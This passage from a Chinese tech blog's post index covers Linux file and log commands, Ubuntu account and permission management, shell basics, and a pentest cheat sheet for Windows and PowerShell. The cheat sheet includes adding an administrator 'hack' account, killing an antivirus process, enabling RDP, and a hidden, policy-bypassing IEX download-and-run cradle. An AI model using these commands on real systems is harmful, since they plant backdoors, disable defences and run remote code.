查看几天之内被访问的文件 find . -atime +2 # -atime n, File was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件 0x04 查看被修改过的文件 1 今天被访问的文件 find /home -ctime 0 #查看home 目录下今天被修改过的文件 2 查看几天之内被访问的文件 find . -ctime +2 # -ctime n, File was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件 0x05 更多查看文件的用法 … … ","date":"2020-03-20","objectID":"/linux%E6%89%BE%E5%87%BA%E6%9C%80%E8%BF%91%E6%88%96%E8%80%85%E4%BB%8A%E5%A4%A9%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%96%87%E4%BB%B6/:0:0","tags":["Linux",""],"title":"linux找出最近或者今天被修改的文件","uri":"/linux%E6%89%BE%E5%87%BA%E6%9C%80%E8%BF%91%E6%88%96%E8%80%85%E4%BB%8A%E5%A4%A9%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%96%87%E4%BB%B6/"},{"categories":["Linux"],"content":" 文件 /var/run/utmp 记录现在登入的用户 文件 /var/log/wtmp 记录用户所有的登入和登出 文件 /var/log/lastlog 记录每一个用户最后登入时间 文件 /var/log/btmp 记录错误的登入尝试（注：可以查看电脑是否正在被爆破） 文件 /var/log/auth.log 需要身份确认的操作(可能存在) ","date":"2020-03-20","objectID":"/linux%E4%B8%8B%E9%9D%A2%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/:0:0","tags":["Linux","日志"],"title":"Linux下面一些安全日志文件","uri":"/linux%E4%B8%8B%E9%9D%A2%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/"},{"categories":["渗透测试"],"content":"1、windows系统基础命令 ipconfig /all 获取ip地址 linux：ifconfig -a Route print 路由信息 Arp -a arp缓存 Netsh firewall show config 查看防火墙规则 Netsh firewall show state Netstat -an 获取端口信息 Whoami 当前用户权限 Hostname 主机名称 Set 环境变量 Query user 查看远程终端在线用户 Systeminfo 获取操作系统版本、类型、位数等相关信息、安装； -b： 显示包含于常见每个链接或监听端口的可执行组件； -o： 显示与每个连接相关的所属进程ID； -v： 与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件； Netstat -anb 进程号、端口开放情况、开放端口程序、监听端口组件 Netsata -ano tcp/udp协议信息、端口、进程号 Netstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等 Net start 获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程 Net stop servicesname 停止服务命令 Net start servicename 开启服务命令 Tasklist /svc 获取运行的进程名称、服务、PID Driverquery 查看已安装驱动程序列表 Net start 查看已经启动的windows服务 Msinfo32 获取更加详细的信息 Taskkill 是windows自带的终止进程程序 TASKKILL [/S system [/U username [/P [password]]]]{ [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] #例如：taskkill /pid 452 /f taskkill /im 360tray /f #用户管理命令： Net user hack 123 /add 添加hack用户 密码为123 Net localgroup adminnistrators hack /add 添加hack为管理员权限 Net localgroup adminnistrators 查看当前系统管理员 Net localgroup \"remote desktop users\" hack /add 加入远程桌面用户组 Net user hack 查看指定用户的信息 Net user guest /active:yes 激活guest用户 Net user guest 123 2、windows系统开启远程桌面（mstsc/rdesktop） #XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）： REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f #Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）： wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #Winserver2008/2012/Win2k3/win7 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 #Winserver2008/2012/ wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 #XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）： meterpreter \u003e run getgui -e 3、查看远程端口 通过注册表查看： REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDP-Tcp /v PortNumber 查询rdp端口号 set /a port = query hex value 通过命令查看 Tasklist /svc |find \"TermService\" Netstat -ano |find \"1980\" 本文转载 ","date":"2020-03-19","objectID":"/windows%E5%91%BD%E4%BB%A4%E7%AE%80%E8%AE%B0/:0:0","tags":["渗透测试","Windows命令"],"title":"Windows命令简记","uri":"/windows%E5%91%BD%E4%BB%A4%E7%AE%80%E8%AE%B0/"},{"categories":["渗透测试"],"content":" PowerShell技术概学 本文内容较琐碎，思路较混乱，仅当入门小小小基础吧 ","date":"2020-03-19","objectID":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:0:0","tags":["PowerShell","渗透测试"],"title":"PowerShell基础知识","uri":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"Powershell基础 特点 可以面向对象 绑定.net 兼容性好 灵活 基本常识 在PowerShell下，类似 cmd命令 叫作cmdlet 命令规范：动词-名词 ， 不区分大小写 可以直接在cmd中运行powershell来打开 查看PowerShell版本 Get-Host 或者 $PSversionTable.PSVERSION ps1文件： 一个PowerShell脚本其实就是一个简单的文本文件 运行脚本 1.完整路径 2.当前路径:./test.ps1 基本命令 Get-Command ： 得到所有PowerShell命令 Get-Process ： 获取所有进程 Get-Help ： 显示有关 Windows PowerShell 命令和概念的信息 Get-History ： 获取在当前会话中输入的命令的列表 Get-Job ： 获取在当前会话中运行的 Windows PowerShell 后台作业 dir –r 执行策略 Get-ExecutionPolicy #查看当前策略 - Restricted #脚本不能运行（默认） - RemoteSigned #本地创建的脚本可以运行，但从网上下载的脚本不能运行 - AllSigned #仅当脚本由信任的发布者签名时才能运行 - Unrestricted #允许所有的脚本运行 绕过本地权限执行脚本 powershell.exe -ExexutionPolicy ByPass -File xxx.ps1 # -ExexutionPolicy ByPass 绕过执行安全策略 本地隐藏绕过权限执行脚本 powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1 # -WindowStyle Hidden 隐藏窗口 # -NoLogo 启动不显示版权标志的PowerShell 用IEX下载远程PS1脚本绕过权限执行脚本 powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(\"xxx.ps1\");[Parameters] # -NonI 非交互模式 # -NoProfile / -NoP 不加载当前用户的配置文件 # Noexit 执行后不退出Shell （这在使用键盘记录等脚本时非常重要） 可以直接在终端进行数字计算…..笑死 自定义Powershell控制台 右键自己看着自己的习惯调整吧 编辑选项： 快速编辑选项（操作快且方便） 标准编辑选项 Powershell快捷键 与linux中相似 alt+F7 #清除命令的历史记录 PgUp PgDn #翻页的效果 Esc #情况命令行（我还是喜欢 ^L） Home #移动到命令行最左端 End #移动到命令行最右端 Powershell管道和重定向 基于对象的 管道： #找字符串 ls | findstr \"an\" # 查看name列 ls | Format-table name # 还可以sort等 `get-process p* | stop-process` # 找到p...的进程，然后停止 重定向： # \u003e, \u003e\u003e #重定向到文件中 ls | Format-table name \u003e\u003e test.txt Powershell数学运算 直接在终端执行即可，无需多讲 进行存储单位换算： 运算/比较 #运算 1gb/1mb*18kb # 比较 1gb -gt 1mb 进制转换，比如十六进制：0xa Powershell执行外部命令 打开应用 #直接打开 notepad #或者带双引号 \u0026\"notepad\" # 直接打开服务 services.exe # 查看环境变量 $env:path # 仅在当前终端设置环境变量（临时生效） $env$path=$env$path+\"路径\" Powershell命令集 一般是动词-名词结构 查看所有命令：Get-Command 查看命令帮助: get-help 查看命令历史：get-history Powershell别名 使用 # 查看所有别名 get-alias # 可以查看命令别名 get-help 命令 # 查看别名对应的真实的命令 get-alias -name ls # 找出以remove开头的别名(): get-alias | where {$_.definition.startswitch(\"Remove\")} # 查询所有别名最多的，并排序 get-alias |group-object definition |sort -descending Count 自定义别名 # 临时定义（退出终端就不生效了） set-alias -name pad -value notepad` # 删除别名 del alias pad ## 永久设置别名（写入Windows PowerShell profile文件） #1.查看此文件在计算机中的位置： $profile #2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址： New-Item -Type file -Force $profile #3.打开文件将一些内容写入文件，创建别名，比如; Set-Alias notepad++ \"C:\\Development Kit\\Notepad++\\notepad++.exe\" # 导出别名 export-alias demp.ps1 # 导入别名 import-alias -force demo.ps1 Powershell变量 变量基础 #定义变量 $name=\"hhh\" #打印 直接$name # Note: 大小写不敏感，所以特殊变量尽量用花括号 ${\"i am a boy\"}=\"ggggg\" # 可以直接运算 $n=(2+8*10)/2 # 多个变量同时值 $n1=$n2=1 $m, $n=1, 2 #调换变量值 $n1, $n2=$n2, $n1 变量操作 # 查看变量是否存在 test-path test-path variable:$n1 # 删除变量 del variable:$n1 remove-variable ## powershell提供了五个专门管理变量的命令 Clear-Variable Get-Variable New-Variable Remove-Variable Set-Variable ### 变量写保护（只读） #1.设置 $server = '10.10.10.10' Set-Variable server -option Readonly #2.新建时 New-Variable nu1 -Value 100 -Force -Option readonly #上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。 # 选项Constant，常量一旦声明，不可修改 new-variable num -Value \"strong\" -Option constant 自动化变量 1.用户信息：例如用户的根目录$home 2.配置信息:例如powershell控制台的大小，颜色，背景等。 3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。 # 比如：终端一打开就自动加载的变量 # 用户根目录 $home # 跟linux下基本一样 $$ #包含会话所收到的最后一行中的最后一个令牌。 $^ #包含会话所收到的最后一行中的第一个令牌。 $? #上一个命令的返回值 $_ #包含管道对象中的当前对象 $pid #进程id $null $Host $LastExitCode #包含运行的最后一个基于 Windows 的程序的退出代码。 参考：这里 环境变量 #查看环境变量 ls env ls env:name #查看具体环境变量的值 $env:windir # 新建用户环境变量(临时) $env:name=\"xxx\" # 新建环境变量(长久) xxx # 在环境变量的PATH下添加一条内容 $Env:path=$Env:Path+\";C:\\Go\\bin\" # .net方式只对用户变量生效 [environment]::setenvironment(\"PATH\",\"D:\\\",\"User\") # .net获取值 [environment]::getenvironment(\"PATH\",\"User\") # 删除环境变量 del env:name #或 remove-item env:name 在其他脚本中使用powershell #比如bat @echo off powershell \"\u0026'c:\\Users\\test\\e.psl'\" Powershell条件判断 条件操作符 -eq 等于 -ne 不等与 -gt 大于 -lt 小于 -le 小于等于 -contains #布尔 -not 取反 -ant -or -xor # 比如： 80 -eq 70 1gb -gt lmb (1,2,3) -contains 2 if语句 写脚本编辑器ISE里面了 $num=56 if($num -gt 50 -and $num -lt 60) { \"大于5","date":"2020-03-19","objectID":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:1:0","tags":["PowerShell","渗透测试"],"title":"PowerShell基础知识","uri":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"常用的PowerShell攻击工具： PowerSploit NiShang Empire (基于PowerShell的远控木马) PowerCat (PowerShell版的NetCat) ","date":"2020-03-19","objectID":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:2:0","tags":["PowerShell","渗透测试"],"title":"PowerShell基础知识","uri":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"其他技巧 … … ","date":"2020-03-19","objectID":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:3:0","tags":["PowerShell","渗透测试"],"title":"PowerShell基础知识","uri":"/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"​ ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:0:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"用户账号管理基础 用户账号管理 为新员工创建账号 修改账号密码策略 禁用休假员工账号 删除离职员工账号(一般先禁用, 如果要删除, 注意提前把重要文件备份) 设置账号访问权限(只赋予其工作必需的权限) 每个人保管自己的密码 不要将密码泄露给任何人 保证密码复杂度 不要将密码写在纸条贴在限制器上 关于Linux账号管理基础知识 Root账号 能做任何事情（甚至删除操作系统自身） 大部分Linux发行版安装时要求设置root账号密码 而Ubuntu默认禁用Root账号 可sudo或临时切换为root账号 可手动启用root账号 平时以普通员工账号管理计算机 在Ubuntu中执行sudo rm -rf /后，有提示 安装过程中创建管理员个人账号： 作为日常管理使用 创建账号 # 本机用户账号存储文件: `/etc/passwd` # 冒号分隔：第二列是占位符(x来代替密码，此文件不存储密码,在shadow中)，第三四列（uid,组id）root的id是0，第五列是用户描述，第六列是主目录,最后一列是终端类型 # 逗号分隔的部分： # 创建用户（useradd） 建议添加-m参数 useradd user01 -m # 一般是这样使用多 useradd user01 -m -d /home/user01 # -d自定义主目录位置，父目录必须是存在 # 如果只是sudo useradd user01 #是没有用户家目录的，且该用户的终端为sh # 新添加的账号的uid是递增的（系统会自动创建一个和uid相同的组id组账号） # 参数： -d # 账号主目录（复制于/etc/skel） -m # 同时创建主目录（默认首次登录时创建主目录） 用户主目录内容拷贝自`/etc/skel` -c # 全名（描述,即/etc/passwd中第五列那个） -e # 账号过期（YYYY-MM-DD） -- 适合临时工作的人 -N # 不创建同名组账号(gid会默认设置为100) useradd user01 -m -N -g # 指定主组（必须已经存在） useradd user01 -m -g sudo -G # 额外组 # Note: 账号名最长32个字符（不要以数字或其他特殊字符开头） # 给用户设置密码 sudo passwd user02 ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:1:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"账号数据库 1./etc/passwd 格式：用户名:密码占位符:UID:GID:全名(描述),房间号,公司电话,家庭电话,others:主目录:shell 2./etc/shadow 存放密码等其他相关信息, 默认root才能查看与读写 格式：用户名:密码:上次修改时间:密码最小使用期限:密码最长使用期:'密码'过期前几天提醒:密码过期几天后账号会被锁定:'账号'过期日(距离1970-01-01的天数):保留 密码位置为!、*的账号不能直接登陆系统(其他账号登录可切换为其账号) , !表示密码被锁定 上次修改时间：自从1970-01-01起的天数，如果为0表示用户下次登陆需要修改密码，空表示关闭密码过期功能(不会被锁定) 密码最长使用期限\u003c密码最小使用期 时候，用户无法更改密码(一般会设置密码有效期为90天) 密码过期几天后账号会被锁定： 账号过期用户不能登录 密码过期看是否锁定账号 账户修改：建议多登陆几个会话备用，防止手滑出现问题导致登不上去 设置账号密码 passwd user01 # 参数： -l # 锁定账户密码 sudo passwd -l user01 -u # 解锁账号 sudo passwd -u user01 -d # 删除密码（账号无密码可登录） -n/-x # 密码最小 / 最大 使用期限 -w # 密码过期前几天发警告 -i # 密码过期后锁账号 -e # 密码立刻过期（下次登录必须修改密码） -s # 查看账号的密码状态(L 锁定, P有密码,NP没密码 ) passwd -aS # 查看账号密码状态（同上） passwd -a -S 添加账号 adduser 参数少，更简洁 adduser user02 # 基于useradd的perl脚本 # 并非所有Linux发行版中都包含 # 向导方式运行（不需记忆命令参数） # 位置： /usr/sbin/adduser # 另一个批量添加账号 newusers sudo newusers users.txt # 文件内容按passwd格式填写: user05:pass15:::hahaha:/home/user15:/bin/bash 删除账号 userdel或deluser sudo userdel user02 # 不会删除主目录 userdel -r user02 # 删除账号同时删除主目录（一般先禁用几个月等到不需要一下文件时候再删除但是要提前备份） userdel -f user02 # 强制删除文件 rm -rf /home/user02 # 删除用户主目录 切换账号 # 切换到root账号 su # 需要输入root密码（默认root没密码,先给root设密码[sudo passwd root]再操作） sudo su # 输入当前账号密码(是输入的当前账号的密码) sudo -i # 同上（root前面的命令提示符是井号） exit退出到自己的回话 sudo -s # 同上 # 切换到其他账号 su user01 # 切换到其他账号（输入的user01的密码） sudo su user01 #切换到其他账号（输入的是当前用户的密码） ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:2:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"组账号管理 分组归类统一管理 将用户账号分组管理和指派权限 用户创建同时生成同名的组账号 每个文件有唯一的所属账号和所属组（属主、数组） 每个用户可以同属属于多个组，但只有一个主组 查看当前用户所属的组： groups cat /etc/groups 格式： 组名:密码(通常不使用):GID:逗号分隔的'成员'用户账号 组管理 sudo groupadd g_name # 添加组 sudo groupdel g_name # 删除组 gpasswd -a u_name g_name # 将用户加入'额外组' gpasswd -d u_name g_name # 将用户从组中删除 usermod -aG g_name user # 将用户加入'额外组' a是添加,G是组 # -a 附件（否则替换） usermod -g g_name user # 修改用户的'主组' -g 把user01的主组改为IT: sudo usermod -g IT user01 usermod -d /home/user2 user2 -m # 将某用户主目录内容移动到当前目录 usermod -l user2 user1 # 将用户user1修改为user2(只是名称换了，其他的权限和id都不变) # 等等其他参数...... ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:3:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"密码策略 使用足够复杂的密码 Pluggable Authentication Module(PAM) # 安装pam apt install libpam-cracklib # vim /etc/pam.d/common-password 增加配置 password required pam_pwhistory.so.remember=9 use_authok # 最近几次的密码不能相同 权限 每个文件和文件夹拥有唯一的属主和属组（ls -l） 权限类型： r, w, x 读，写，执行 4, 2, 1 （这个数字是二进制转换来的，假设数组的权限为r–,对应二进制为100,转为十进制为4，其他类似） u，g，o 属主，属组，其他 # 除了第一位，后面每三位一组（所有者u，所有组g，其他用户o） -rwxrwxrwx # 权限 文件 文件夹 # R 读取文件内容，拷贝 列出目录内容 # W 更改文件内容 创建、删除文件及文件夹 # X 作为应用程序执行文件 cd进入；读取文件属性和权限 权限修改命令： chmod ## 只有其属主和root可以修改权限 ## 对文件 # + - 方式 chmod u+x a.txt chmod u-r a.txt chmod g-x a.txt chmod o+r a.txt # 数字方式 chmod 777 b.txt chmod 764 b.txt ## 对目录(一般都给x权限，不然cd不进去) chmod u+x code/ chmod u-wx code/ # 对目录：r只能看到里面的文件，要写看到属性，得加x权限 # 父级目录的权限/子文件的权限 # 递归修改权限 chmod 770 -R code/ ## 权限与搜索 find . -perm 770 # 搜索权限为770的文件 # -type f 只搜文件； -type d 只搜目录 find /path/dir/ -type f perm 664 -user xps -group xps # 属于xps组，属于xps用户，权限为664的文件 find /path/dir/ -type f perm 755 -user xps -exec ls -l {}\\; # 搜索完之后执行命令 find /path/dir/ -type f perm 755 -user xps -exec chmod 770 {}\\; # 搜索完之后再进行权限修改 # 如果用户删了，并且该用户有文件没删除干净，下面找到没有所属用户的文件或文件夹 find /home -nouser -exec rm -rf {}\\; # 查找无有效属主对象，然后删除 ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:4:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"属主与属组 修改属主和属组 # chown需要sudo sudo chown user01 a.txt # 修改a.txt的所有者为user01 sudo chown -R user01 /code # 递归修改目录的所有者 # 修改所有组为user01 sudo chgrp user01 a.txt # 所有者和所有组都修改 chown user01:user01 a.txt 特殊权限 Setuid(4) 主要针对可执行程序 一旦设置了suid之后：任何用户执行程序时都具备使用属主的权限 设置：chmod u+s a.sh或chmod 4777 /bin/cat (前面三个二进制, 二进制为100,即4；第二种数值方式对链接不生效) 比如使用passwd修改自己密码的时候修改的是shadow文件(他的属主是root)，它就是设置了s权限 如果不太懂，尽量不要随便设置suid，否则后患无穷 Setgid(2) 主要针对可执行程序和目录 对于程序一旦设置了sgid：任何用户执行程序时都具备使用属组的权限 应用于目录时：可实现共享文件访问效果(新建文件的数组集成目录属组): 一个用户再在里面新建文件之后，一个组里的用户就都可以共享 设置：chmod g+s code/或sudo chmod 2775 /bin/cat 设置完之后，数组位置权限就多了s权限 stick bit(1) 针对目录的受限删除位（root、属主可以删） 典型例子：/tmp目录 设置： chmod o+t code/ 加了stick位(其他用户的位置)，自己创建的文件只有自己能删除，别人无法删除 ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:5:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"权限管理 掩码 决定文件和目录的默认权限 - 文件默认权限：666-掩码（如果掩码为002, 6-2=4，权限就为664） - 文件夹默认权限：777-掩码（如果掩码为002, 7-2=5，权限就为775） 命令：umask查看当前掩码 修改掩码命令：umask 007（临时性的） 长久修改： 配置文件vi /etc/login.defs # 配置其中umask UMASK 022 # 属主的掩码0，数组的掩码2，其他用户的掩码2 USERGROUPS_ENAB yes # 改为yes，属主的掩码来覆盖数组的掩码 # 要想使得真正的权限与umask设置的一致： F1.可以把上面的改为no F2.设置用户账号名称和组账号名称不一样，让用户id和组id也不一样（推荐这种方式修改） sudo usermod -g users user01 # 把用户的主组改为users umask 002 用户名与组名相同、UID与GID相同 umask 027 通常设置027就行 ","date":"2020-03-18","objectID":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/:6:0","tags":["Linux","ubuntu","账号管理"],"title":"ubuntu server-账号管理","uri":"/ubuntu-server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"shell脚本的一些基本知识","date":"2020-03-16","objectID":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","tags":["Linux","Shell"],"title":"Linux Shell基础知识","uri":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"应用场景 自动批量系统初始化（update，软件安装，时区设置，安全策略…） 自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx) 管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID） 日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk） 自动化备份恢复程序(MySQL完全/增量备份 + Crond) 自动化管理程序(批量远程修改密码，软件升级，配置更新) 自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 自动化扩容（增加云主机-\u003e部署应用） Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线） 程序的组成： 逻辑 + 数据 ","date":"2020-03-16","objectID":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:1:0","tags":["Linux","Shell"],"title":"Linux Shell基础知识","uri":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"基本用法 一.常识 1.输入输出重定向 ## 文件描述符：0，1,2 (对应：进程输入的文件，进程输入的文件，进程打开错误的文件) 0表示标准输入 1表示标准输出 2表示标准错误输出 ## 输入输出重定向 # \u003e, \u003e\u003e \u003e 默认为标准输出重定向，与 1\u003e 相同 2\u003e\u00261 把标准错误输出 重定向到 标准输出. \u0026\u003ea.txt 把标准输出 和 标准错误输出 都重定向到文件中 # 2\u003e, 2\u003e\u003e 错误输出最佳 # 2\u003e\u003e\u00261, \u0026\u003e 描述符为2的内容输入到描述符为1的内容(\u0026\u003e 是混合输出) cat \u003c /etc/hosts #（没加任何参数） 和不加\u003c的机制不一样 cat \u003c /etc/hosts \u003e test/aaa.txt # 相当于copy文件内容 cat \u003c\u003c EOF # 输入内容让cat来执行 cat \u003c\u003cEOF \u003e file1 # 把一会输入的文件放到文件里面去 # 混合重定向 输出到/dev/null就是什么都不显示到终端 \u0026\u003e /dev/null 2.一些快捷键 # ^R 搜索历史命令 # ![number] 执行历史命令中编号为`number`的命令 # ! string 找到最近一个以指定str开头的命令, 如：!da # !! 上一个命令（在脚本中是不能手动按方向键的） # !$ shell上一个命令的最后一个参数， 比如：ls aaa/bb /etc/passwd, 再执行： head !$, 看到是的passwd的内容 # ^D 退出 # ^A 跳到最前 # ^E 跳到最后 # ^K 向后删除 # ^U 向前 删除 # ^Y 撤销 # ^L # ^S 锁屏暂停 # ^Q 恢复 3.在bash程序中嵌入一个python代码 #!/bin/bash # 第一行不是注释， 声明用哪个解释器 #! ping -c1 114.114.114.114 \u0026\u0026 echo \"114.114.114.114 is up\" || echo \"114.114.114.114 id down\" # \u003c\u003c-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范 # 整个程序还是使用bash解释器，只不过是中间\"请来一个人 - python\" # 如下： /usr/bin/python3 \u003c\u003c-EOF print(\"hello py\") EOF echo \"hello bash\" # 在bash中调用 python： expect # 如果在python中使用bash， 要调用os.system('系统命令') 没有-的话，EOF作为结束符，前面不能有任何tab制表符。 有-的话，EOF作为结束符，前面可以有tab制表符,容错率更高一点。 4.配合figlet打印菜单: #!/bin/bash cat \u003c\u003cEOF +-----------------------------------------------------+ | _ | | _ __ ___ __ _ _ __ _ _ __ _| | | | | '_ \\` _ \\ / _\\` | '_ \\| | ||/ _\\` | | | | | | | | | | (_| | | | | |_| |(_| | | | | |_| |_| |_|\\__,_|_||_|\\__,_|\\__,_|_| | | | +-----------------------------------------------------+ EOF 5.子shell #!/bin/bash cd ~/Desktop ls # 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的） # 要想使得subshell中的生效，就要使用`.` 或者 `source` ####### 执行脚本 ./01.sh # 需要执行权限，在子shell中执行 bash 01.sh # 不需要执行权限，在子shell中执行 01.sh # 需要执行权限，在当前shell中执行 source 01.sh # 不需要执行权限，在当前shell中执行 6.shell元字符 通配符, 注意区分与正则中的元字符 #！/bin/bash # * 任意多个字符 ls /etc/net* # ? 任意一个字符 ls home/xp? # [] 匹配括号内任意一个字符 [abc] [a-z] [^a-zA-Z0-9] # ^取反 l[io]ve l[^a-z]ve # () 命令在子shell中执行 (umask 077; touch test.txt) # 不影响创建文件的权限，当前shell的umask也没有改变 # ----- 回顾，子shell： .test.sh, source x.sh # {} 集合 touch {1..9} mkdir /home/{111,222} mkdir -pv /home/{333,{aaa,bbb}, 444} cp -rv /etc/{passwd, passwd.old} # 前面的相同的路径可以写在一块，后面不同的{}起来 cp -rv /etc/passwd{,.old} # 前面的相同的路径可以写在一块，后面不同的{}起来 # \\ 转义符 让元字符回归本意 echo \\* echo \\\\ echo \\ #后面紧跟回车，也就转义了回车 # -e 常规字符转变为特殊意义的： echo -e \"a\\tb\\nc\" 7.前台后台 #!/bin/bash ## \u0026 (关闭xshell，对应的任务也跟着停止) sh test.sh \u0026 ## nohub #任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中 nohup sh test.sh ## 区分`nohub`与`\u0026`: 1.\u0026 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出 2.nohub 退出终端之后该进程还是有的 ## nohub与\u0026合体 #将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。 nohup sh test.sh \u0026 ## screen apt install screen # 安装 `sleep 100000` # 先执行,然后退出终端， `screen -list` # 再次打开终端,指定这个命令，看到id `screen -r yourID` # 然后输入这个命令,一切就回来了 ## shell的会话作业机制 ctrl +c # 杀掉的是前台进程 # ^Z 放到后台， fg 调回来 kill %3 # 给当前终端作业号为3的发信号 ## jobs 查看作业 ## 管道 | # tee 管道, -a 最佳 date | tee -a date.txt # 输出到文件，同时截流（能在终端直观地看到） ## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续 8.命令排序 ; 不具备逻辑排序 （前面执行完毕就执行后面的，不管前面成功失败与否） \u0026\u0026 前面执行成功(即返回值$?为0)就执行后面的 || 前面执行失败(即返回值$?为不为0)就执行后面的 相当于 if else 9.echo颜色输出 使用场景：给用户醒目提示 #!/bin/bash # -e 才可以 # \\e[1;3x # \\e[1;3x 前景色(30-37),m后面是文字 echo -e \"\\e[1;31mThis is a red\" echo -e \"\\e[1;33mThis is a yellow\" # 0m 恢复颜色 echo -e \"\\e[1;0m\" echo -e \"no color\" ## 常用： 前面变色之后， 后面紧跟：\\e[0m 不变色(后面的内容就正常了) echo -e \"\\e[1;31mThis is a red text. \\e[0m\" echo -e \"no color again\" ## 背景色(40-47) echo -e \"\\e[1;41mThis is a red text background coloe. \\e[0m\" echo -e \"\\e[1;42mThis is a red text background coloe. \\e[0m\" echo -e \"\\e[1;43mThis is a red text background coloe. \\e[0m\" echo -e \"\\e[1;44mThis is a red text background 